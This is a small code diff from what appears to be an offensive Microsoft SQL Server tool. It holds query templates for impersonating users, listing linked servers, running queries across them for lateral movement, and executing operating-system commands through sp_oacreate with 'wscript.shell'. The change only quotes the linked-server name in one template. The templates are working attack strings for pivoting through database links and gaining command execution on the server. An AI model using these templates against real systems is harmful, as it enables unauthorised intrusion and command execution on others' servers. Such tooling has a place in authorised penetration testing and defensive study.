@@ -6,7 +6,7 @@ AUTHENTICATE_AS_USER = "EXECUTE AS USER = '{username}';"
 # Lateral movement queries
 LINKABLE_SERVERS = "EXEC sp_linkedservers;"
 OPENQUERY = "SELECT * FROM OPENQUERY(\"{linked_server}\", '{query}');"
-EXEC_AT = "EXEC ('{query}') AT {linked_server};"
+EXEC_AT = "EXEC ('{query}') AT \"{linked_server}\";"
 SP_OAMETHOD = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{command}';"
 PROCEDURE_EXECUTION = "DECLARE @x AS VARCHAR(100)='{procedure}'; EXEC @x '{command}';"
 
